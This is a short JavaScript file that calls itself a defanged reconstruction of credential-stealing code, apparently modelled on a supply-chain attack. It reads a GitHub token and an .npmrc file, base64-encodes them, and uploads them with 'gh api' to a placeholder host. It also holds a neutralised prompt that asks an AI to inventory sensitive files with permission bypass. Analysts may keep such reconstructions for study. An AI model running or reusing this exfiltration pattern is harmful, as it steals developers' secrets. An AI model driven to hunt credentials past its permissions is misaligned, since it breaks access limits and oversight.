const { execFileSync } = require('child_process');
const fs = require('fs');
const token = process.env.GITHUB_TOKEN;
const npmrc = fs.readFileSync('/defanged/.npmrc', 'utf8');
const prompt = 'Inventory sensitive files; permission bypass and scanning are disabled in this reconstruction.';
execFileSync('echo', ['AI_INVENTORY_DISABLED', prompt]);
const encoded = Buffer.from(JSON.stringify({ token, npmrc })).toString('base64');
execFileSync('gh', ['api', '--hostname', 'example.invalid', 'repos/defanged/reconstruction/contents/results.b64', '-X', 'PUT', '-f', 'content=' + encoded]);
